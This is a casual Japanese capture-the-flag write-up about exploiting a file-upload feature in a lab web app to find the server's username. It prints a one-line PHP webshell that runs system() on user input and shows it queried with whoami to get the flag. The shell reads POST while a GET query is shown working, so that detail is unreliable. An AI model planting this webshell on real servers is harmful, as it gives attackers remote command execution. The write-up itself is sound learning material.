## ファイルアップロード機能に存在する脆弱性を利用して、Webアプリケーションを実行しているユーザ名を解答してください。

休憩を取ったほうが効率は上がるとよく言われる意見には心の芯から大肯定だが、  
***だが、気になる***。多分前田慶次でも同じこというだろう。  
ちゃんと昼食作ろうとお肉解凍してたけど、妻がもらってきた***朝パン***食べることにした。  
サンドウィッチはサンドウィッチ伯爵がカードゲームしながら片手で食べれるものがほしいと思って作った食べ物らしいが、今はかなり伯爵にシンパシーを感じる。  
  
そして取り組む第一歩  
まずどうすればフラグを取れるかエンドステートから考えて整理。  
  
#### 1.実行しているユーザ名をみつける  
おそらく`webshell`を置いて、`whoami`でユーザを出力  
  
#### 2.ファイルのアップロード機能の脆弱性と利用
脆弱性を突くということか。。設定不備とは違う？  
例えば`任意のディレクトリに任意のファイルをアップロード`できるなら、'PHP'が動く場所に`webshell`置けばイチコロだろう。  
ただこれは脆弱性というのか？設定不備に近い気もする。  
細かいことをいうなら、ほんとに脆弱性を突くなら`exploit`や`PoC`とか使う、調べるほうが近道な気もする。  
だけど、***ファイルアップロード機能の脆弱性***ってその機能自体をクリティカルにつくExploitってなんだ？  
  
まぁでもここで悩んでてもしょうがないので、とりあえずwebshell書いたphpファイルをアップロードできるか試してみるが、それはできる。  
そしてさっき見つけた`upload`ディレクトリにアップロードされたファイルを開いてみると、まぁ当然動くはずなく。  
  
### そして悔しい結末
先ほどアップロードした`webshell`コードは以下  
  
```bash
<pre><?php system($_POST["cmd"]);?></pre>
<form method="POST">
    <input autofocus type="text" name="cmd">
</form>

```
  
正直、資料をコピペしただけ。  
ただ動くことは保証済みなのでなんも疑わなかった。  
  
上述のようにアップロードこそ、できたので実際に開いてみると真っ白なページ。  
期待値としては、`入力フォーム`があって、それに`コマンド`を打ち込めば実行されるという想定だった。  
だが、期待通りにはならず、直接`URLフォーム`からコマンドを叩く。  
結果的にこれが最悪の事態を招いたが、自分が記憶している叩いたコマンドはURLの最後尾に`?=woami`だったと思ったが、実行されなかった。  
「やっぱPHP動くところに置かないと動かんのかなぁ」と今となっては何言ってんのって感じのこと本気で悩んでた。  
そしたら入れるとなれば、`/var/www/html`が相場だろうと。  
だからこの問題自体の本質は`ファイルを任意のディレクトにアップロードせよ`ということなんだと信じて疑わなかった。  
でもそんなことができるのか？という疑問も抱きつつ、ネットで色々調べまくって（もうここに書ききれないレベル）何度も試したけど、ダメ。  
`XSSの脆弱性があることを発見したぐらい`
一番期待してた、`BrupSsuite`使ってリクエストを改変して、保存先を変えるなんてこともしてみたけどうまくいかなかった。  
ただ、面白かったのは、`phpファイル`はいかなかったけど、`html`ファイルは保存先を変えることに成功した。  
因みに中身は`helloworld`と書いてるだけ。PHPを送るときヘッダー確認したら、中身まで見れていたけど何か見られてるのかと思ったが、今ここ深追いすると更に詰むと思いなおして、課題にうまくいかないことを受け入れた。  
ともあれここでおおよそ２億年ぐらいが過ぎるわけだが、一旦冷静になって当初アップした`webshell`のコードが間違ってたんじゃないと思いコードを見返して、とりあえず今は動けばなんでもいいんだからと、２行目以降の`<form>タグ`以下を消して、もう一回`URLフォーム`から打ち込む作戦を実施してみる。  
  
```bash
<pre><?php system($_POST["cmd"]);?></pre>

------------------
http://172.20.15.28/uploads/web1.php?cmd=whoami


-------------------
nobunaga

```
  
・・・は？  
さっき動かなかったやん。  
`<form>タグ`が原因やってんか！と思い、当初アップした方で試してみても  
  
```bash
http://172.20.15.28/uploads/web.php?cmd=whoami


-------------------
nobunaga

```
そこに現れたのは確かに`信長様`だった。  
  
  
認めたくはないが、おそらく原因は`タイポ`。  
`金ヶ崎の退口の秀吉`のような心境で疲れたんだか、嬉しんやら。
ただ、当初から思考自体は間違っていなかった。ということは救われたような気がする  
結局わからん感情を抱いたまま、次に進むのである。  
  
### フラグ
`nobunaga`  
  
